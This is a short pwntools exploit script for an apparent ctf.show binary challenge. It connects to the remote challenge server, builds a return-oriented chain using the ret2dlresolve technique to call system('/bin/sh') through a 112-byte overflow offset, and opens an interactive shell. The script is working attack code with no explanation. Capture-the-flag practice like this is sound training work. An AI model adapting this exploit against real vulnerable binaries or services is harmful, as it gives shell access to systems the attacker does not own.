from pwn import *
context.log_level = 'debug'
#io = process("./pwn")
io = remote('pwn.challenge.ctf.show',28287)
elf = ELF('./pwn')
rop = ROP('./pwn')
dlresolve = Ret2dlresolvePayload(elf,symbol="system",args=["/bin/sh"])
rop.read(0,dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()
io.recvuntil("Welcome to CTFshowPWN!\n")
payload = flat({112:raw_rop,256:dlresolve.payload})
io.sendline(payload)
io.interactive()
